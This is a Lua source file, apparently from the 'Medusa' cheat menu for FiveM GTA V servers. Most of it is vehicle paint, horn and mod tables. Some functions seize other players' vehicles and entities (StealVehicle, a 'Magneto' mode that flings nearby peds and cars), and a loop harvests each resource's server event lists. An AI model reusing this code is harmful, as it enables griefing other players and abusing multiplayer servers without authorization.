	Selected = 1,
	Values = {"", "_mk2"},
	Words = {"Mk I", "Mk II"},
}

ComboOptions.EnginePower = {
	Selected = 1,
	Values = {1.0, 25.0, 50.0, 100.0, 200.0, 500.0, 1000.0},
	Words = {"Default", "+25%", "+50%", "+100%", "+200%", "+500%", "+1000%"}
}

ComboOptions.XenonColor = {
	Selected = 1,
	Values = {-1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12},
	Words = {"Default", "White", "Blue", "Electric", "Mint", "Lime", "Yellow", "Gold", "Orange", "Red", "Pink", "Hot Pink", "Purple", "Blacklight"}
}

local function GetDirtLevel(vehicle)
	local x = GetVehicleDirtLevel(vehicle)
	local val = floor(((x / 7.5) + 1) + 0.5)
	
	return val
end

ComboOptions.DirtLevel = {
	Selected = GetDirtLevel,
	Values = {0.0, 7.5, 15.0},
	Words = {"Clean", "Dirty", "Filthy"}
}

local function RepairVehicle(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	RequestControlOnce(vehicle)
	SetVehicleFixed(vehicle)
	SetVehicleLightsMode(vehicle, 0)
	SetVehicleLights(vehicle, 0)
	SetVehicleBurnout(vehicle, false)
	SetVehicleEngineHealth(vehicle, 1000.0)
	SetVehicleFuelLevel(vehicle, 100.0)
	SetVehicleOilLevel(vehicle, 100.0)
	return true
end

local function FlipVehicle(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	return SetVehicleOnGroundProperly(vehicle)
end

local function GetVehicleInFrontOfMe()
	
	local playerPos = GetEntityCoords( PlayerPedId() )
	local inFront = GetOffsetFromEntityInWorldCoords( ped, 0.0, 8.0, 0.0 )
	local rayHandle = CastRayPointToPoint( playerPos.x, playerPos.y, playerPos.z, inFront.x, inFront.y, inFront.z, 10, PlayerPedId(), 0 )
    local _, _, _, _, vehicle = GetRaycastResult( rayHandle )
	
	return vehicle
end

local function RemoveVehicle(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	SetEntityAsMissionEntity(vehicle, true, true)
	DeleteVehicle(vehicle)

	return true
end

local function TeleportToPlayerVehicle(player)
	local ped = GetPlayerPed(player)
	if not IsPedInAnyVehicle(ped) then
		return Medusa.SendNotification({text = ("%s is not in a vehicle!"):format(GetPlayerName(player)), type = "error"})
	end

	local vehicle = GetVehiclePedIsUsing(GetPlayerPed(player))

	local seats = GetVehicleMaxNumberOfPassengers(vehicle)
	for i = 0, seats do
		if IsVehicleSeatFree(vehicle, i) then
			SetPedIntoVehicle(PlayerPedId(), vehicle, i)
			break
		end
	end
end

local function ChangeVehiclePlateText(vehicle)
	local plateText = KeyboardInput("Enter new plate text", "", 8)

	if vehicle ~= 0 then 
		SetVehicleNumberPlateText(vehicle, plateText)
		return true
	end

	return false
end

local function DriveVehicle(vehicle)
	if vehicle == 0 then
		vehicle = GetVehicleInFrontOfMe()
	end

	SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
end

local function StealVehicle(vehicle)
	local ped = GetPedInVehicleSeat(vehicle, -1)
	local vehicleNet = VehToNet(vehicle)

	RequestControlOnce(ped)
	ClearPedTasksImmediately(ped)

	while not IsVehicleSeatFree(NetToVeh(vehicleNet), -1) do
		Wait(0)
	end

	SetPedIntoVehicle(PlayerPedId(), NetToVeh(vehicleNet), -1)
	TaskWarpPedIntoVehicle(PlayerPedId(), NetToVeh(vehicleNet), -1)

	return true
end

ComboOptions.VehicleActions = {
	Selected = 1,
	Values = {RepairVehicle, FlipVehicle, DriveVehicle, RemoveVehicle},
	Words = {"Repair", "Flip", "Drive", "Delete"}
}

local currentMods = nil
local EngineUpgrade = {-1, 0, 1, 2, 3}
local VehicleUpgradeWords = {

	{"STOCK", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "LEVEL 3", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "LEVEL 3", "LEVEL 4", "MAX LEVEL"},

}

local themeColors = {
	purple = { r = 10, g = 223, b = 152, a = 255 },
}
-- Set a default menu theme
_menuColor.base = themeColors.purple

local dynamicColorTheme = false

local texture_preload = {
	"commonmenu",
	"heisthud",
	"mpweaponscommon",
	"mpweaponscommon_small",
	"mpweaponsgang0_small",
	"mpweaponsgang1_small",
	"mpweaponsgang0",
	"mpweaponsgang1",
	"mpweaponsunusedfornow",
	"mpleaderboard",
	"mphud",
	"mparrow",
	"pilotschool",
	"shared",
}

local function PreloadTextures()
	
	--Medusa.Functions.Print("^7Preloading texture dictionaries...")
	for i = 1, #texture_preload do
		RequestStreamedTextureDict(texture_preload[i])
	end

end

PreloadTextures()

local function KillYourselfThread()
	local playerPed = PlayerPedId()
	local canSuicide = false
	local foundWeapon = nil

	GiveWeaponToPed(playerPed, GetHashKey("WEAPON_PISTOL"), 250, false, true)

	if HasPedGotWeapon(playerPed, GetHashKey('WEAPON_PISTOL')) then
		if GetAmmoInPedWeapon(playerPed, GetHashKey('WEAPON_PISTOL')) > 0 then
			canSuicide = true
			foundWeapon = GetHashKey('WEAPON_PISTOL')
		end
	end

	if canSuicide then
		if not HasAnimDictLoaded('mp_suicide') then
			RequestAnimDict('mp_suicide')

			while not HasAnimDictLoaded('mp_suicide') do
				Wait(0)
			end
		end

		SetCurrentPedWeapon(playerPed, foundWeapon, true)

		Wait(1000)

		TaskPlayAnim(playerPed, "mp_suicide", "pistol", 8.0, 1.0, -1, 2, 0, 0, 0, 0 )

		Wait(750)

		SetPedShootsAtCoord(playerPed, 0.0, 0.0, 0.0, 0)
		SetEntityHealth(playerPed, 0)
	end
end

local validResources = {}
local validResourceEvents = {}
local validResourceServerEvents = {}

local function KillYourself()
	CreateThread(KillYourselfThread)
end

local function GetResources()
    local resources = {}
	for i = 1, GetNumResources() do
		resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end

local function VerifyResource(resourceName)
	TriggerEvent(resourceName .. ".verify", function(resource) validResources[#validResources + 1] = resource end)
end

for i, v in ipairs(GetResources()) do
	VerifyResource(v)
end


local function RefreshResourceData()
	for i, v in ipairs(validResources) do
		TriggerEvent(v .. ".getEvents", function(rscName, events) validResourceEvents[rscName] = events end)
	end
end

local function UpdateServerEvents()
	for i, v in ipairs(validResources) do
		TriggerEvent(v .. ".getServerEvents", function(rscName, events) validResourceServerEvents[rscName] = events end)
	end
end

local function RefreshServerEvents()
	while true do
		UpdateServerEvents()
		Wait(5000)
	end
end

CreateThread(RefreshServerEvents)

RefreshResourceData()

local function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function MagnetoModeThread()
	local ForceKey = Medusa.Keys["E"]
	local Force = 0.5
	local KeyPressed = false
	local KeyTimer = 0
	local KeyDelay = 15
	local ForceEnabled = false
	local StartPush = false

	function forcetick()
		
		if (KeyPressed) then
			KeyTimer = KeyTimer + 1
			if (KeyTimer >= KeyDelay) then
				KeyTimer = 0
				KeyPressed = false
			end
		end
		
		
		
		if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
			KeyPressed = true
			ForceEnabled = true
		end
		
		if (StartPush) then
			
			StartPush = false
			local pid = PlayerPedId()
			local CamRot = GetGameplayCamRot(2)
			
			local force = 5
			
			local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
			local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
			local Fz = force * (CamRot.x * 0.2)
			
			local PlayerVeh = GetVehiclePedIsIn(pid, false)
			
			for k in EnumerateVehicles() do
				SetEntityInvincible(k, false)
				if IsEntityOnScreen(k) and k ~= PlayerVeh then
					ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
				end
			end
			
			for k in EnumeratePeds() do
				if IsEntityOnScreen(k) and k ~= pid then
					ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
				end
			end
		
		end
		
		
		if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
			KeyPressed = true
			StartPush = true
			ForceEnabled = false
		end
		
		if (ForceEnabled) then
			local pid = PlayerPedId()
			local PlayerVeh = GetVehiclePedIsIn(pid, false)
			
			Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
			
			DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 35, false, true, 2, nil, nil, false)
			
			for k in EnumerateVehicles() do
				SetEntityInvincible(k, true)
				if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
					RequestControlOnce(k)
					FreezeEntityPosition(k, false)
					Oscillate(k, Markerloc, 0.5, 0.3)
				end
			end
			
			for k in EnumeratePeds() do
				if IsEntityOnScreen(k) and k ~= PlayerPedId() then
					RequestControlOnce(k)
					SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
					FreezeEntityPosition(k, false)
					Oscillate(k, Markerloc, 0.5, 0.3)
				end
			end
		
		end
	
	end

	while Medusa.Toggle.MagnetoMode do forcetick()Wait(0) end
end

local function MagnetoMode()
    Medusa.Toggle.MagnetoMode = not Medusa.Toggle.MagnetoMode
    
	if Medusa.Toggle.MagnetoMode then
		Medusa.SendNotification({text = "Press ~b~E~s~ to use Magneto", type = "info"})

        CreateThread(MagnetoModeThread)
	end
end

local function SelfRagdollThread()
	while Medusa.Toggle.SelfRagdoll do
		SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, 0, 0, 0)
		Wait(5)
	end
end

local function SelfRagdoll()
	Medusa.Toggle.SelfRagdoll = not Medusa.Toggle.SelfRagdoll

	if Medusa.Toggle.SelfRagdoll then
		CreateThread(SelfRagdollThread)
	end
end

-- Config for LSC
local LSC = {}

LSC.vehicleMods = {
	{name = "Spoilers", id = 0, meta = "modSpoilers"},
	{name = "Front Bumper", id = 1, meta = "modFrontBumper"},
	{name = "Rear Bumper", id = 2, meta = "modRearBumper"},
	{name = "Side Skirt", id = 3, meta = "modSideSkirt"},
	{name = "Exhaust", id = 4, meta = "modExhaust"},
	{name = "Frame", id = 5, meta = "modFrame"},
	{name = "Grille", id = 6, meta = "modGrille"},
	{name = "Hood", id = 7, meta = "modHood"},
	{name = "Fender", id = 8, meta = "modFender"},
	{name = "Right Fender", id = 9, meta = "modRightFender"},
	{name = "Roof", id = 10, meta = "modRoof"},
	{name = "Xenon Lights", id = 22, meta = "modXenon"},
	{name = "Vanity Plates", id = 26, meta = "modVanityPlate"},
	{name = "Trim", id = 27, meta = "modTrim"},
	{name = "Ornaments", id = 28, meta = "modOrnaments"},
	{name = "Dashboard", id = 29, meta = "modDashboard"},
	{name = "Dial", id = 30, meta = "modDial"},
	{name = "Door Speaker", id = 31, meta = "modDoorSpeaker"},
	{name = "Seats", id = 32, meta = "modSeats"},
	{name = "Steering Wheel", id = 33, meta = "modSteeringWheel"},
	{name = "Shifter Leavers", id = 34, meta = "modShifterLeavers"},
	{name = "Plaques", id = 35, meta = "modPlaques"},
	{name = "Speakers", id = 36, meta = "modSpeakers"},
	{name = "Trunk", id = 37, meta = "modTrunk"},
	{name = "Hydraulics", id = 38, meta = "modHydraulics"},
	{name = "Engine Block", id = 39, meta = "modEngineBlock"},
	{name = "Air Filter", id = 40, meta = "modAirFilter"},
	{name = "Struts", id = 41, meta = "modStruts"},
	{name = "Arch Cover", id = 42, meta = "modArchCover"},
	{name = "Aerials", id = 43, meta = "modAerials"},
	{name = "Trim 2", id = 44, meta = "modTrimB"},
	{name = "Tank", id = 45, meta = "modTank"},
	{name = "Windows", id = 46, meta = "modWindows"},
	{name = "Livery", id = 48, meta = "modLivery"},
	{name = "Horns", id = 14, meta = "modHorns"},
	{name = "Wheels", id = 23, meta = "modFrontWheels"},
	{name = "Back Wheels", id = 24, meta = "modBackWheels"},
	-- {name = "Wheel Types", id = "wheeltypes"},
	-- {name = "Extras", id = "extra"},
	-- {name = "Neons", id = "neon"},
	-- {name = "Paint", id = "paint"},
}

LSC.perfMods = {
	{name = "Armor", id = 16, meta = "modArmor"},
	{name = "Engine", id = 11, meta = "modEngine"},
	{name = "Brakes", id = 12, meta = "modBrakes"},
	{name = "Transmission", id = 13, meta = "modTransmission"},
	{name = "Suspension", id = 15, meta = "modSuspension"},
}

LSC.horns = {
	["HORN_STOCK"] = -1,
	["Truck Horn"] = 1,
	["Police Horn"] = 2,
	["Clown Horn"] = 3,
	["Musical Horn 1"] = 4,
	["Musical Horn 2"] = 5,
	["Musical Horn 3"] = 6,
	["Musical Horn 4"] = 7,
	["Musical Horn 5"] = 8,
	["Sad Trombone Horn"] = 9,
	["Classical Horn 1"] = 10,
	["Classical Horn 2"] = 11,
	["Classical Horn 3"] = 12,
	["Classical Horn 4"] = 13,
	["Classical Horn 5"] = 14,
	["Classical Horn 6"] = 15,
	["Classical Horn 7"] = 16,
	["Scaledo Horn"] = 17,
	["Scalere Horn"] = 18,
	["Salemi Horn"] = 19,
	["Scalefa Horn"] = 20,
	["Scalesol Horn"] = 21,
	["Scalela Horn"] = 22,
	["Scaleti Horn"] = 23,
	["Scaledo Horn High"] = 24,
	["Jazz Horn 1"] = 25,
	["Jazz Horn 2"] = 26,
	["Jazz Horn 3"] = 27,
	["Jazz Loop Horn"] = 28,
	["Starspangban Horn 1"] = 28,
	["Starspangban Horn 2"] = 29,
	["Starspangban Horn 3"] = 30,
	["Starspangban Horn 4"] = 31,
	["Classical Loop 1"] = 32,
	["Classical Horn 8"] = 33,
	["Classical Loop 2"] = 34,

}

LSC.WheelType = {"Sport", "Muscle", "Lowrider", "SUV", "Offroad", "Tuner", "Bike", "High End"}

LSC.neonColors = {
	["White"] = {255,255,255},
	["Blue"] ={0,0,255},
	["Electric Blue"] ={0,150,255},
	["Mint Green"] ={50,255,155},
	["Lime Green"] ={0,255,0},
	["Yellow"] ={255,255,0},
	["Golden Shower"] ={204,204,0},
	["Orange"] ={255,128,0},
	["Red"] ={255,0,0},
	["Pony Pink"] ={255,102,255},
	["Hot Pink"] ={255,0,255},
	["Purple"] ={153,0,153},
}

LSC.paintsClassic = { -- kill me pls
	{name = "Black", id = 0},
	{name = "Carbon Black", id = 147},
	{name = "Graphite", id = 1},
	{name = "Anhracite Black", id = 11},
	{name = "Black Steel", id = 2},
	{name = "Dark Steel", id = 3},
	{name = "Silver", id = 4},
	{name = "Bluish Silver", id = 5},
	{name = "Rolled Steel", id = 6},
	{name = "Shadow Silver", id = 7},
	{name = "Stone Silver", id = 8},
	{name = "Midnight Silver", id = 9},
	{name = "Cast Iron Silver", id = 10},
	{name = "Red", id = 27},
	{name = "Torino Red", id = 28},
	{name = "Formula Red", id = 29},
	{name = "Lava Red", id = 150},
	{name = "Blaze Red", id = 30},
	{name = "Grace Red", id = 31},
	{name = "Garnet Red", id = 32},
	{name = "Sunset Red", id = 33},
	{name = "Cabernet Red", id = 34},
	{name = "Wine Red", id = 143},
	{name = "Candy Red", id = 35},
	{name = "Hot Pink", id = 135},
	{name = "Pfsiter Pink", id = 137},
	{name = "Salmon Pink", id = 136},
	{name = "Sunrise Orange", id = 36},
	{name = "Orange", id = 38},
	{name = "Bright Orange", id = 138},
	{name = "Gold", id = 99},
	{name = "Bronze", id = 90},
	{name = "Yellow", id = 88},
	{name = "Race Yellow", id = 89},
	{name = "Dew Yellow", id = 91},
	{name = "Dark Green", id = 49},
	{name = "Racing Green", id = 50},
	{name = "Sea Green", id = 51},
	{name = "Olive Green", id = 52},
	{name = "Bright Green", id = 53},
	{name = "Gasoline Green", id = 54},
	{name = "Lime Green", id = 92},
	{name = "Midnight Blue", id = 141},
	{name = "Galaxy Blue", id = 61},
	{name = "Dark Blue", id = 62},
	{name = "Saxon Blue", id = 63},
	{name = "Blue", id = 64},
	{name = "Mariner Blue", id = 65},
	{name = "Harbor Blue", id = 66},
	{name = "Diamond Blue", id = 67},
	{name = "Surf Blue", id = 68},
	{name = "Nautical Blue", id = 69},
	{name = "Racing Blue", id = 73},
	{name = "Ultra Blue", id = 70},
	{name = "Light Blue", id = 74},
	{name = "Chocolate Brown", id = 96},
	{name = "Bison Brown", id = 101},
	{name = "Creeen Brown", id = 95},
	{name = "Feltzer Brown", id = 94},
	{name = "Maple Brown", id = 97},
	{name = "Beechwood Brown", id = 103},
	{name = "Sienna Brown", id = 104},
	{name = "Saddle Brown", id = 98},
	{name = "Moss Brown", id = 100},
	{name = "Woodbeech Brown", id = 102},
	{name = "Straw Brown", id = 99},
	{name = "Sandy Brown", id = 105},
	{name = "Bleached Brown", id = 106},
	{name = "Schafter Purple", id = 71},
	{name = "Spinnaker Purple", id = 72},
	{name = "Midnight Purple", id = 142},
	{name = "Bright Purple", id = 145},
	{name = "Cream", id = 107},
	{name = "Ice White", id = 111},
	{name = "Frost White", id = 112},
}

LSC.paintsMatte = {
	{name = "Black", id = 12},
	{name = "Gray", id = 13},
	{name = "Light Gray", id = 14},
	{name = "Ice White", id = 131},
	{name = "Blue", id = 83},
	{name = "Dark Blue", id = 82},
	{name = "Midnight Blue", id = 84},
	{name = "Midnight Purple", id = 149},
	{name = "Schafter Purple", id = 148},
	{name = "Red", id = 39},
	{name = "Dark Red", id = 40},
	{name = "Orange", id = 41},
	{name = "Yellow", id = 42},
	{name = "Lime Green", id = 55},
	{name = "Green", id = 128},
	{name = "Forest Green", id = 151},
	{name = "Foliage Green", id = 155},
	{name = "Olive Darb", id = 152},
	{name = "Dark Earth", id = 153},
	{name = "Desert Tan", id = 154},
}

LSC.paintsMetal = {
	{name = "Brushed Steel", id = 117},
	{name = "Brushed Black Steel", id = 118},
	{name = "Brushed Aluminum", id = 119},
	{name = "Pure Gold", id = 158},
	{name = "Brushed Gold", id = 159},
}

function LSC.GetHornName(index)
	if (index == 0) then
		return "Truck Horn"
	elseif (index == 1) then
		return "Cop Horn"
	elseif (index == 2) then
		return "Clown Horn"
	elseif (index == 3) then
		return "Musical Horn 1"
	elseif (index == 4) then
		return "Musical Horn 2"
	elseif (index == 5) then
		return "Musical Horn 3"
	elseif (index == 6) then
		return "Musical Horn 4"
	elseif (index == 7) then
		return "Musical Horn 5"
	elseif (index == 8) then
		return "Sad Trombone"
	elseif (index == 9) then
		return "Classical Horn 1"
	elseif (index == 10) then
		return "Classical Horn 2"
	elseif (index == 11) then
		return "Classical Horn 3"
	elseif (index == 12) then
		return "Classical Horn 4"
	elseif (index == 13) then
		return "Classical Horn 5"
	elseif (index == 14) then
		return "Classical Horn 6"
	elseif (index == 15) then
		return "Classical Horn 7"
	elseif (index == 16) then
		return "Scale - Do"
	elseif (index == 17) then
		return "Scale - Re"
	elseif (index == 18) then
		return "Scale - Mi"
	elseif (index == 19) then
		return "Scale - Fa"
	elseif (index == 20) then
		return "Scale - Sol"
	elseif (index == 21) then
		return "Scale - La"
	elseif (index == 22) then
		return "Scale - Ti"
	elseif (index == 23) then
		return "Scale - Do"
	elseif (index == 24) then
		return "Jazz Horn 1"
	elseif (index == 25) then
		return "Jazz Horn 2"
	elseif (index == 26) then
		return "Jazz Horn 3"
	elseif (index == 27) then
		return "Jazz Horn Loop"
	elseif (index == 28) then
		return "Star Spangled Banner 1"
	elseif (index == 29) then
		return "Star Spangled Banner 2"
	elseif (index == 30) then
		return "Star Spangled Banner 3"
	elseif (index == 31) then
		return "Star Spangled Banner 4"
	elseif (index == 32) then
		return "Classical Horn 8 Loop"
	elseif (index == 33) then
		return "Classical Horn 9 Loop"
	elseif (index == 34) then
		return "Classical Horn 10 Loop"
	elseif (index == 35) then
		return "Classical Horn 8"
	elseif (index == 36) then
		return "Classical Horn 9"
	elseif (index == 37) then
		return "Classical Horn 10"
	elseif (index == 38) then
		return "Funeral Loop"
	elseif (index == 39) then
		return "Funeral"
	elseif (index == 40) then
		return "Spooky Loop"
	elseif (index == 41) then
		return "Spooky"
	elseif (index == 42) then
		return "San Andreas Loop"
	elseif (index == 43) then
		return "San Andreas"
	elseif (index == 44) then
		return "Liberty City Loop"
	elseif (index == 45) then
		return "Liberty City"
	elseif (index == 46) then
		return "Festive 1 Loop"
	elseif (index == 47) then
		return "Festive 1"
	elseif (index == 48) then
		return "Festive 2 Loop"
	elseif (index == 49) then
		return "Festive 2"
	elseif (index == 50) then
		return "Festive 3 Loop"
	elseif (index == 51) then
		return "Festive 3"
	else
		return "Unknown Horn"
	end
end

function LSC.UpdateMods()
	currentMods = Medusa.Game.GetVehicleProperties(Medusa.Player.Vehicle)
	--SetVehicleModKit(Medusa.Player.Vehicle, 0)
end

function LSC:CheckValidVehicleExtras()
	local playerPed = PlayerPedId()
	local playerVeh = GetVehiclePedIsIn(playerPed, false)
	local valid = {}

	for i=0,50,1 do
		if(DoesExtraExist(playerVeh, i))then
			local realModName = "Extra #"..tostring(i)
			local text = "OFF"
			if(IsVehicleExtraTurnedOn(playerVeh, i))then
				text = "ON"
			end
			local realSpawnName = "extra "..tostring(i)
			table.insert(valid, {
				menuName=realModName,
				data ={
					["action"] = realSpawnName,
					["state"] = text
				}
			})
		end
	end

	return valid
end


function LSC:DoesVehicleHaveExtras(vehicle)
	for i = 1, 30 do
		if ( DoesExtraExist( vehicle, i ) ) then
			return true
		end
	end

	return false
end


function LSC:CheckValidVehicleMods(modID)
	local playerPed = PlayerPedId()
	local playerVeh = GetVehiclePedIsIn(playerPed, false)
	local valid = {}
	local modCount = GetNumVehicleMods(playerVeh,modID)

	-- Handle Liveries if they don't exist in modCount
	if (modID == 48 and modCount == 0) then

		-- Local to prevent below code running.
		local modCount = GetVehicleLiveryCount(playerVeh)
		for i=1, modCount, 1 do
			local realIndex = i - 1
			local modName = GetLiveryName(playerVeh, realIndex)
			local realModName = GetLabelText(modName)
			local modid, realSpawnName = modID, realIndex

			valid[i] = {
				menuName=realModName,
				data = {
					["modid"] = modid,
					["realIndex"] = realSpawnName
				}
			}
		end
	end
	-- Handles all other mods
	for i = 1, modCount, 1 do
		local realIndex = i - 1
		local modName = GetModTextLabel(playerVeh, modID, realIndex)
		local realModName = GetLabelText(modName)
		local modid, realSpawnName = modCount, realIndex


		valid[i] = {
			menuName=realModName,
			data = {
				["modid"] = modid,
				["realIndex"] = realSpawnName
			}
		}
	end


	-- Insert Stock Option for modifications
	if(modCount > 0)then
		local realIndex = -1
		local modid, realSpawnName = modID, realIndex
		table.insert(valid, 1, {
			menuName="Stock",
			data = {
				["modid"] = modid,
				["realIndex"] = realSpawnName
			}
		})
	end

	return valid
end
---------------------
--  Vehicle Class  --
---------------------
local function SpawnLocalVehicle(modelName, replaceCurrent, spawnInside)
	local speed = 0
	local rpm = 0

	if Medusa.Player.IsInVehicle then
		local oldVehicle = Medusa.Player.Vehicle
		speed = GetEntitySpeedVector(oldVehicle, true).y
		rpm = GetVehicleCurrentRpm(oldVehicle)
	end

	if IsModelValid(modelName) and IsModelAVehicle(modelName) then
		RequestModel(modelName)

		while not HasModelLoaded(modelName) do
			Wait(0)
		end

		local pos = (spawnInside and GetEntityCoords(PlayerPedId()) or GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 4.0, 0.0))
		local heading = GetEntityHeading(PlayerPedId()) + (spawnInside and 0 or 90)

		if replaceCurrent then
			RemoveVehicle(Medusa.Player.Vehicle)
		end

		local vehicle = CreateVehicle(GetHashKey(modelName), pos.x, pos.y, pos.z, heading, true, false)

		if spawnInside then
			SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
			SetVehicleEngineOn(vehicle, true, true)
		end
		
		SetVehicleForwardSpeed(vehicle, speed)
		SetVehicleCurrentRpm(vehicle, rpm)
		
		SetEntityAsNoLongerNeeded(vehicle)

		SetModelAsNoLongerNeeded(modelName)
	end


end


local VehicleClass = {
	
	-- VEHICLES LISTS
	compacts = {
		{"BLISTA"},
		{"BRIOSO", "sssa_dlc_stunt"},
		{"DILETTANTE", "mpinventory", "mp_specitem_coke"},
		-- {"DILETTANTE2"},
		{"ISSI2", "sssa_default"},
		{"ISSI3", "sssa_dlc_assault"},
		{"ISSI4"},
		{"ISSI5"},
		{"ISSI6"},
		{"PANTO", "sssa_dlc_hipster"},
		{"PRAIRIE", "sssa_dlc_battle"},
		{"RHAPSODY", "sssa_dlc_hipster"}
	},
	
	sedans = {
		{"ASEA", "sssa_dlc_business"},
		{"ASEA2"},
		{"ASTEROPE", "sssa_dlc_business", "astrope"},
		{"COG55", "lgm_dlc_apartments"},
		{"COG552", "lgm_dlc_apartments", "cog55"},
		{"COGNOSCENTI", "lgm_dlc_apartments", "cognosc"},
		{"COGNOSCENTI2", "lgm_dlc_apartments", "cognosc"},
		{"EMPEROR"},
		{"EMPEROR2"},
		{"EMPEROR3"},
		{"FUGITIVE", "sssa_default"},
		{"GLENDALE", "sssa_dlc_hipster"},
		{"INGOT", "sssa_dlc_business"},
		{"INTRUDER", "sssa_dlc_business"},
		{"LIMO2"},
		{"PREMIER", "sssa_dlc_business"},
		{"PRIMO"},
		{"PRIMO2", "lsc_default"},
		{"REGINA"},
		{"ROMERO", "sssa_dlc_battle"},
		{"SCHAFTER2", "sssa_dlc_heist"},
		{"SCHAFTER5"},
		{"SCHAFTER6"},
		{"STAFFORD", "lgm_dlc_battle"},
		{"STANIER", "sssa_dlc_business"},
		{"STRATUM", "sssa_dlc_business"},
		{"STRETCH", "sssa_default"},
		{"SUPERD", "lgm_default"},
		{"SURGE", "sssa_dlc_heist"},
		{"TAILGATER"},
		{"WARRENER"},
		{"WASHINGTON", "sssa_dlc_business", "washingt"},
	},
	
	suvs = {
		{"BALLER"},
		{"BALLER2", "sssa_default"},
		{"BALLER3", "lgm_dlc_apartments"},
		{"BALLER4", "lgm_dlc_apartments"},
		{"BALLER5"},
		{"BALLER6"},
		{"BJXL", "sssa_dlc_battle"},
		{"CAVALCADE", "sssa_default", "cavcade"},
		{"CAVALCADE2", "sssa_dlc_business", "cavcade2"},
		{"CONTENDER", "sssa_dlc_mp_to_sp"},
		{"DUBSTA"},
		{"DUBSTA2"},
		{"FQ2", "sssa_dlc_battle"},
		{"GRANGER", "sssa_dlc_business"},
		{"GRESLEY", "sssa_dlc_heist"},
		{"HABANERO", "sssa_dlc_battle"},
		{"HUNTLEY", "lgm_dlc_business2"},
		{"LANDSTALKER", "sssa_dlc_heist"},
		{"MESA", "candc_default"},
		{"MESA2"},
		{"PATRIOT", "sssa_dlc_battle"},
		{"PATRIOT2", "sssa_dlc_battle"},
		{"RADI", "sssa_dlc_business"},
		{"ROCOTO", "sssa_default"},
		{"SEMINOLE", "sssa_dlc_heist"},
		{"SERRANO", "sssa_dlc_battle"},
		{"TOROS", "lgm_dlc_apartments"},
		{"XLS", "lgm_dlc_executive1"},
		{"XLS2"},
	},
	
	coupes = {
		{"COGCABRIO", "lgm_default", "cogcabri"},
		{"EXEMPLAR", "sssa_default"},
		{"F620", "sssa_dlc_business"},
		{"FELON", "sssa_default"},
		{"FELON2", "sssa_default"},
		{"JACKAL", "sssa_dlc_heist"},
		{"ORACLE", "sssa_default"},
		{"ORACLE2"},
		{"SENTINEL", "sssa_dlc_business"},
		{"SENTINEL2"},
		{"WINDSOR", "lgm_dlc_Medusae"},
		{"WINDSOR2", "lgm_dlc_executive1"},
		{"ZION", "sssa_default"},
		{"ZION2", "sssa_default"},
	},
	
	muscle = {
		{"BLADE", "sssa_dlc_heist"},
		{"BUCCANEER"},
		{"BUCCANEER2", "lsc_default"},
		{"CHINO", "lgm_dlc_Medusae"},
		{"CHINO2", "lsc_default"},
		{"CLIQUE", "lgm_dlc_arena"},
		{"COQUETTE3", "lgm_dlc_Medusae"},
		{"DEVIANT", "lgm_dlc_apartments"},
		{"DOMINATOR", "sssa_dlc_business", "dominato"},
		{"DOMINATOR2", "sssa_dlc_mp_to_sp"},
		{"DOMINATOR3", "sssa_dlc_assault"},
		{"DOMINATOR4"},
		{"DOMINATOR5"},
		{"DOMINATOR6"},
		{"DUKES", "candc_default"},
		{"DUKES2", "candc_default"},
		{"ELLIE", "sssa_dlc_assault"},
		{"FACTION"},
		{"FACTION2", "lsc_default"},
		{"FACTION3", "lsc_lowrider"},
		{"GAUNTLET", "sssa_default"},
		{"GAUNTLET2", "sssa_dlc_mp_to_sp"},
		{"HERMES", "sssa_dlc_xmas2017"},
		{"HOTKNIFE", "lgm_default"},
		{"HUSTLER", "lgm_dlc_xmas2017"},
		{"IMPALER", "sssa_dlc_vinewood"},
		{"IMPALER2"},
		{"IMPALER3"},
		{"IMPALER4"},
		{"IMPERATOR"},
		{"IMPERATOR2"},
		{"IMPERATOR3"},
		{"LURCHER", "sssa_dlc_halloween"},
		{"MOONBEAM"},
		{"MOONBEAM2", "lsc_default"},
		{"NIGHTSHADE", "lgm_dlc_apartments", "NITESHAD"},
		{"PHOENIX"},
		{"PICADOR"},
		{"RATLOADER"},
		{"RATLOADER2"},
		{"RUINER", "sssa_dlc_battle"},
		{"RUINER2", "candc_importexport"},
		{"RUINER3"},
		{"SABREGT"},
		{"SABREGT2", "lsc_lowrider2"},
		{"SLAMVAN", "sssa_dlc_christmas_2"},
		{"SLAMVAN2"},
		{"SLAMVAN3", "lsc_lowrider2"},
		{"SLAMVAN4"},
		{"SLAMVAN5"},
		{"SLAMVAN6"},
		{"STALION", "sssa_dlc_mp_to_sp"},
		{"STALION2", "sssa_dlc_mp_to_sp"},
		{"TAMPA", "sssa_dlc_christmas_3"},
		{"TAMPA3", "candc_gunrunning"},
		{"TULIP", "sssa_dlc_arena"},
		{"VAMOS", "sssa_dlc_arena"},
		{"VIGERO", "sssa_default"},
